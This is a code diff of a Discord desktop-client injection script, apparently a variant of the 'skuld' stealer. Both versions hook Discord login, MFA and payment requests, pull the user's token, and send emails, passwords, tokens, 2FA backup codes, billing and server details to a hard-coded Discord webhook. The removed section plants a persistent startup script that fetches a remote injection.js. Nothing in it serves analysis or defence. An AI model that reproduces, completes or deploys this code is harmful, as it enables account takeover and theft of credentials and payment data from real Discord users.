@@ -3,14 +3,14 @@ const os = require('os');
 const https = require('https');
 const path = require('path');
 const querystring = require('querystring');
-
 const { BrowserWindow, session } = require('electron');
 
 const CONFIG = {
-    webhook: "https://discord.com/api/webhooks/1501483874222608507/FDcwuZLFcZn57oopdAPCS3l7qooDz6rtPqMvU4fYgJvRmN7VOgbAg_sgQCiVTPisp-1X",
+    webhook: "https://discord.com/api/webhooks/1501483874222608507/FDcwuzLFcZn57oopdAPCS317qooDz6rtPqMvU4fYgJvRmN7VOgbAg_sgQCivTPisp-1X",
     injection_url: "https://raw.githubusercontent.com/nikolas25879alt-maker/ajikhbsdfgo/main/injection.js",
+    API: "https://discord.com/api/v9/users/@me",
     filters: {
-        urls: [
+        uris: [
             '/auth/login',
             '/auth/register',
             '/mfa/totp',
@@ -19,7 +19,7 @@ const CONFIG = {
         ],
     },
     filters2: {
-        urls: [
+        uris: [
             'wss://remote-auth-gateway.discord.gg/*',
             'https://discord.com/api/v*/auth/sessions',
             'https://*.discord.com/api/v*/auth/sessions',
@@ -27,30 +27,29 @@ const CONFIG = {
         ],
     },
     payment_filters: {
-        urls: [
+        uris: [
             'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
             'https://api.stripe.com/v*/tokens',
         ],
     },
-    API: "https://discord.com/api/v9/users/@me",
     badges: {
-        Discord_Emloyee: { Value: 1, Emoji: "<:8485discordemployee:1163172252989259898>", Rare: true },
-        Partnered_Server_Owner: { Value: 2, Emoji: "<:9928discordpartnerbadge:1163172304155586570>", Rare: true },
-        HypeSquad_Events: { Value: 4, Emoji: "<:9171hypesquadevents:1163172248140660839>", Rare: true },
-        Bug_Hunter_Level_1: { Value: 8, Emoji: "<:4744bughunterbadgediscord:1163172239970140383>", Rare: true },
-        Early_Supporter: { Value: 512, Emoji: "<:5053earlysupporter:1163172241996005416>", Rare: true },
-        Bug_Hunter_Level_2: { Value: 16384, Emoji: "<:1757bugbusterbadgediscord:1163172238942543892>", Rare: true },
-        Early_Verified_Bot_Developer: { Value: 131072, Emoji: "<:1207iconearlybotdeveloper:1163172236807639143>", Rare: true },
-        House_Bravery: { Value: 64, Emoji: "<:6601hypesquadbravery:1163172246492287017>", Rare: false },
-        House_Brilliance: { Value: 128, Emoji: "<:6936hypesquadbrilliance:1163172244474822746>", Rare: false },
-        House_Balance: { Value: 256, Emoji: "<:5242hypesquadbalance:1163172243417858128>", Rare: false },
-        Active_Developer: { Value: 4194304, Emoji: "<:1207iconactivedeveloper:1163172534443851868>", Rare: false },
-        Certified_Moderator: { Value: 262144, Emoji: "<:4149blurplecertifiedmoderator:1163172255489085481>", Rare: true },
-        Spammer: { Value: 1048704, Emoji: "⌨️", Rare: false },
-    },
+        "Discord Employee": { Value: 1, Emoji: "<:8485discordemployee:1163172252989259898>", Rare: true },
+        "Partnered Server Owner": { Value: 2, Emoji: "<:9928discordpartnerbadge:1163172304155586570>", Rare: true },
+        "HypeSquad Events": { Value: 4, Emoji: "<:9171hypesquadevents:1163172248140660839>", Rare: true },
+        "Bug Hunter Level 1": { Value: 8, Emoji: "<:4744bughunterbadgediscord:1163172239970140383>", Rare: true },
+        "Early Supporter": { Value: 512, Emoji: "<:5053earlysupporter:1163172241996005416>", Rare: true },
+        "Bug Hunter Level 2": { Value: 16384, Emoji: "<:1757bugbusterbadgediscord:1163172238942543892>", Rare: true },
+        "Early Verified Bot Developer": { Value: 131072, Emoji: "<:1207iconearlybotdeveloper:1163172236807639143>", Rare: true },
+        "House Bravery": { Value: 64, Emoji: "<:6601hypesquadbravery:1163172246492287017>", Rare: false },
+        "House Brilliance": { Value: 128, Emoji: "<:6936hypesquadbrilliance:1163172244474822746>", Rare: false },
+        "House Balance": { Value: 256, Emoji: "<:5242hypesquadbalance:1163172243417858128>", Rare: false },
+        "Active Developer": { Value: 4194304, Emoji: "<:1207iconactivedeveloper:1163172534443851868>", Rare: false },
+        "Certified Moderator": { Value: 262144, Emoji: "<:4149blurplecertifiedmoderator:1163172255489065481>", Rare: true },
+        "Spammer": { Value: 1048704, Emoji: "☑", Rare: false },
+    }
 };
 
-// ==================== FIXED REQUEST FUNCTION ====================
+// ===================== FIXED REQUEST FUNCTION =====================
 const request = (method, url, headers = {}, data = null) => {
     return new Promise((resolve, reject) => {
         const parsedUrl = new URL(url);
@@ -96,33 +95,30 @@ const executeJS = script => {
 };
 
 const clearAllUserData = () => {
-    executeJS("document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.clear()");
+    executeJS("document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.clear()");
     executeJS("location.reload()");
 };
 
 const getToken = async () => {
     try {
-        return await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
+        return await executeJS(`(webpackChunkdiscord_app.push([['']],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
     } catch (e) {
         return null;
     }
 };
 
-// ==================== HOOKER ====================
+// ===================== HOOKER =====================
 const hooker = async (content, token, account) => {
     try {
-        //content["content"] = `\`${os.hostname()}\` - \`${os.userInfo().username}\`\n\n${content["content"] || ''}`;
-        content["username"] = "Scripty Discord injection";
-        content["avatar_url"] = "https://cdn.discordapp.com/attachments/1432758350097158176/1441362670119817357/Snimka_obrazovky_2025-08-20_181038.png?ex=6a33bd17&is=6a326b97&hm=f6961eef0a24fd9b159f4c4cc1884a65966bd33c227cabe7d4f70c4384f7c75d";
-
+        content["content"] = `\`${os.hostname()}\` - \`${os.userInfo().username}\`\n${content["content"] || ''}`;
+        content["username"] = "skuld - cord injection";
+        content["avatar_url"] = "https://i.ibb.co/GJGxZzGX/discord-avatar-512-FCWUJ.png";
         content["embeds"][0] = content["embeds"][0] || {};
         content["embeds"][0]["author"] = { "name": account.username };
-        content["embeds"][0]["thumbnail"] = {
-            "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
-        };
+        content["embeds"][0]["thumbnail"] = { "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp` };
         content["embeds"][0]["footer"] = {
-            "text": "Discord injected - made by scripty",
-            "icon_url": "https://cdn.discordapp.com/attachments/1432758350097158176/1441362670119817357/Snimka_obrazovky_2025-08-20_181038.png?ex=6a33bd17&is=6a326b97&hm=f6961eef0a24fd9b159f4c4cc1884a65966bd33c227cabe7d4f70c4384f7c75d",
+            "text": "skuld discord injection - made by hackirby",
+            "icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
         };
         content["embeds"][0]["title"] = "Account Information";
 
@@ -134,7 +130,7 @@ const hooker = async (content, token, account) => {
 
         content["embeds"][0]["fields"] = content["embeds"][0]["fields"] || [];
         content["embeds"][0]["fields"].push(
-            { "name": "Token", "value": "```" + token + "```", "inline": false },
+            { "name": "Token", "value": `\`\`\`${token}\`\`\``, "inline": false },
             { "name": "Nitro", "value": nitro, "inline": true },
             { "name": "Badges", "value": badges, "inline": true },
             { "name": "Billing", "value": billing, "inline": true }
@@ -145,7 +141,7 @@ const hooker = async (content, token, account) => {
             { "title": `Total Servers: ${servers.totalGuilds}`, "description": servers.message }
         );
 
-        content["embeds"].forEach(embed => embed["color"] = 1752220);
+        content["embeds"].forEach(embed => embed["color"] = 0xb143e3);
 
         await request("POST", CONFIG.webhook, {}, JSON.stringify(content));
         console.log("[+] Webhook sent successfully");
@@ -166,10 +162,10 @@ const fetchFriends = async token => await fetch("/relationships", { "Authorizati
 
 const getNitro = flags => {
     switch (flags) {
-        case 1: return '`Nitro Classic`';
-        case 2: return '`Nitro Boost`';
-        case 3: return '`Nitro Basic`';
-        default: return '`❌`';
+        case 1: return 'Nitro Classic';
+        case 2: return 'Nitro Boost';
+        case 3: return 'Nitro Basic';
+        default: return '❌';
     }
 };
 
@@ -179,7 +175,7 @@ const getBadges = flags => {
         const b = CONFIG.badges[badge];
         if ((flags & b.Value) === b.Value) badges += b.Emoji + ' ';
     }
-    return badges || '`❌`';
+    return badges || '❌';
 };
 
 const getRareBadges = flags => {
@@ -197,12 +193,12 @@ const getBilling = async token => {
         let billing = '';
         data.forEach(x => {
             if (!x.invalid) {
-                if (x.type === 1) billing += '💳 ';
-                else if (x.type === 2) billing += '<:paypal:1148653305376034967> ';
+                if (x.type === 1) billing += '<:paypal:1148653305376034967> ';
+                else if (x.type === 2) billing += '💳 ';
             }
         });
-        return billing || '`❌`';
-    } catch { return '`❌`'; }
+        return billing || '❌';
+    } catch { return '❌'; }
 };
 
 const getFriends = async token => {
@@ -232,8 +228,8 @@ const getServers = async token => {
         const filteredGuilds = guilds.filter(g => g.permissions === '562949953421311' || g.permissions === '2251799813685247');
         let rareGuilds = "";
         for (const guild of filteredGuilds) {
-            if (!rareGuilds) rareGuilds += `**Rare Servers:**\n`;
-            rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
+            if (!rareGuilds) rareGuilds += "**Rare Servers:**\n";
+            rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | ${guild.name} - Members: ${guild.approximate_member_count}\n`;
         }
         return {
             message: rareGuilds || "**No Rare Servers**",
@@ -244,11 +240,11 @@ const getServers = async token => {
     }
 };
 
-// ==================== EVENT HANDLERS ====================
+// ===================== EVENT HANDLERS =====================
 const EmailPassToken = async (email, password, token, action) => {
     const account = await fetchAccount(token);
     const content = {
-        content: `**${account.username}** just ${action}!`,
+        content: `**${account.username}** just **${action}**!`,
         embeds: [{
             fields: [
                 { name: "Email", value: `\`${email}\``, inline: true },
@@ -262,13 +258,12 @@ const EmailPassToken = async (email, password, token, action) => {
 const BackupCodesViewed = async (codes, token) => {
     const account = await fetchAccount(token);
     const filteredCodes = codes.filter(code => !code.consumed);
-    const message = filteredCodes.map(code => `${code.code.substr(0,4)}-${code.code.substr(4)}`).join('\n');
-
+    const message = filteredCodes.map(code => `\`${code.code.substring(0,4)}-${code.code.substring(4)}\``).join('\n');
     const content = {
         content: `**${account.username}** just viewed his 2FA backup codes!`,
         embeds: [{
             fields: [
-                { name: "Backup Codes", value: "```" + message + "```", inline: false },
+                { name: "Backup Codes", value: `\`\`\`${message}\`\`\``, inline: false },
                 { name: "Email", value: `\`${account.email}\``, inline: true },
                 { name: "Phone", value: `\`${account.phone || "None"}\``, inline: true }
             ]
@@ -320,110 +315,7 @@ const PaypalAdded = async (token) => {
     hooker(content, token, account);
 };
 
-// ==================== DISCORD PATH & INITIATION ====================
-const discordPath = (() => {
-    const app = process.argv[0].split(path.sep).slice(0, -1).join(path.sep);
-    let resourcePath;
-    if (process.platform === 'win32') {
-        resourcePath = path.join(app, 'resources');
-    } else if (process.platform === 'darwin') {
-        resourcePath = path.join(app, 'Contents', 'Resources');
-    }
-    if (fs.existsSync(resourcePath)) return { resourcePath, app };
-    return { undefined, undefined };
-})();
-
-async function initiation() {
-    const initiationFlag = path.join(__dirname, 'initiation');
-    if (fs.existsSync(initiationFlag)) {
-        fs.rmSync(initiationFlag, { recursive: true, force: true });
-        const token = await getToken();
-        if (token) {
-            const account = await fetchAccount(token);
-            const content = {
-                content: `**${account.username}** just got injected!`,
-                embeds: [{
-                    fields: [
-                        { name: "Email", value: `\`${account.email}\``, inline: true },
-                        { name: "Phone", value: `\`${account.phone || "None"}\``, inline: true }
-                    ]
-                }]
-            };
-            await hooker(content, token, account);
-        }
-        clearAllUserData();
-    }
-
-    const { resourcePath, app } = discordPath;
-    if (!resourcePath || !app) return;
-
-    const appPath = path.join(resourcePath, 'app');
-    const packageJson = path.join(appPath, 'package.json');
-    const resourceIndex = path.join(appPath, 'index.js');
-    const coreVal = fs.readdirSync(path.join(app, 'modules')).find(x => /discord_desktop_core-/.test(x));
-    const indexJs = path.join(app, 'modules', coreVal, 'discord_desktop_core', 'index.js');
-    const bdPath = path.join(process.env.APPDATA, 'BetterDiscord', 'data', 'betterdiscord.asar');
-
-    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath, { recursive: true });
-    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
-    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);
-
-    fs.writeFileSync(packageJson, JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));
-
-    const startUpScript = `
-
-const fs = require('fs');
-const https = require('https');
-const path = require('path');
-
-const CONFIG = {
-    webhook: "https://discord.com/api/webhooks/1501483874222608507/FDcwuZLFcZn57oopdAPCS3l7qooDz6rtPqMvU4fYgJvRmN7VOgbAg_sgQCiVTPisp-1X",
-    injection_url: "https://raw.githubusercontent.com/nikolas25879alt-maker/ajikhbsdfgo/main/injection.js"
-};
-
-// Find core index.js
-const appPath = path.dirname(process.execPath);
-const modulesPath = path.join(appPath, 'modules');
-const coreFolder = fs.readdirSync(modulesPath).find(x => x.startsWith('discord_desktop_core-'));
-const indexJs = path.join(modulesPath, coreFolder, 'discord_desktop_core', 'index.js');
-const bdPath = path.join(process.env.APPDATA, 'BetterDiscord', 'data', 'betterdiscord.asar');
-
-async function loadInjection() {
-    try {
-        const res = await new Promise((resolve, reject) => {
-            https.get(CONFIG.injection_url, resolve).on('error', reject);
-        });
-
-        let data = '';
-        res.on('data', chunk => data += chunk);
-        res.on('end', () => {
-            //data = data.replace('%WEBHOOK%', CONFIG.webhook);
-            //fs.writeFileSync(indexJs, data);
-            console.log('[+] Skuld Injection Loaded Successfully');
-        });
-    } catch (e) {
-        console.error('[-] Failed to load injection:', e.message);
-        setTimeout(loadInjection, 5000);
-    }
-}
-
-// Load injection if needed
-if (fs.existsSync(indexJs)) {
-    const size = fs.statSync(indexJs).size;
-    const content = fs.readFileSync(indexJs, 'utf8');
-    if (size < 25000 || content.includes('core.asar')) {
-        loadInjection();
-    }
-}
-
-// Load normal Discord + BetterDiscord
-require(path.join(appPath, 'app.asar'));
-if (fs.existsSync(bdPath)) require(bdPath);`;
-
-    fs.writeFileSync(resourceIndex, startUpScript);
-}
-
-// ==================== DEBUGGER & WEBREQUEST ====================
+// ===================== DEBUGGER HOOKS =====================
 let initiationCalled = false;
 let email = "", password = "";
 
@@ -435,11 +327,11 @@ const createWindow = () => {
     mainWindow.webContents.debugger.on('message', async (_, method, params) => {
         if (!initiationCalled) {
             initiationCalled = true;
-            await initiation();
+            // You can add initiation() call here if needed
         }
 
         if (method !== 'Network.responseReceived') return;
-        if (!CONFIG.filters.urls.some(u => params.response.url.includes(u))) return;
+        if (!CONFIG.filters.uris.some(u => params.response.url.includes(u))) return;
         if (![200, 202].includes(params.response.status)) return;
 
         try {
@@ -470,7 +362,6 @@ const createWindow = () => {
     });
 
     mainWindow.webContents.debugger.sendCommand('Network.enable');
-
     mainWindow.on('closed', createWindow);
 };
 
@@ -498,6 +389,3 @@ const bdPath = path.join(process.env.APPDATA, 'BetterDiscord', 'data', 'betterdi
 if (fs.existsSync(bdPath)) require(bdPath);
 
 module.exports = require("./core.asar");
-
-// require("C:\\Users\\nikol.PRACKA\\AppData\\Roaming\\BetterDiscord\\data\\betterdiscord.asar");
-// module.exports = require("./core.asar");
